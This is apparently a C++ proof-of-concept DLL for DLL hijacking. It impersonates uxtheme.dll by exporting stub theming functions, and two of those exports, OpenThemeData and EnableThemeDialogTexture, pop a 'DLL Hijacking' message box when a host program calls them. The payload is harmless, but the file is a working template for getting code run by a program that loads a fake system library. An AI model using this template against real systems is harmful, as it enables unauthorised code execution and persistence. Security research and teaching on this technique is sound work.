#include <windows.h>

int Main() {
    MessageBoxW(0, L"DLL Hijacking", L"Hello", 0);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
    __declspec(dllexport) void OpenThemeData() {
        Main();
    }

    __declspec(dllexport) void CloseThemeData() {}
    __declspec(dllexport) void DrawThemeBackground() {}
    __declspec(dllexport) void GetThemeBackgroundContentRect() {}
    __declspec(dllexport) void GetThemePartSize() {}
    __declspec(dllexport) void GetThemeFont() {}
    __declspec(dllexport) void SetWindowTheme() {}
    __declspec(dllexport) void EnableThemeDialogTexture() { Main(); }
    __declspec(dllexport) void DrawThemeParentBackground() {}
    __declspec(dllexport) void GetThemeTransitionDuration() {}
    __declspec(dllexport) void BufferedPaintRenderAnimation() {}
    __declspec(dllexport) void EndBufferedAnimation() {}
    __declspec(dllexport) void BeginBufferedAnimation() {}
    __declspec(dllexport) void BufferedPaintStopAllAnimations() {}
    __declspec(dllexport) void DrawThemeTextEx() {}
}
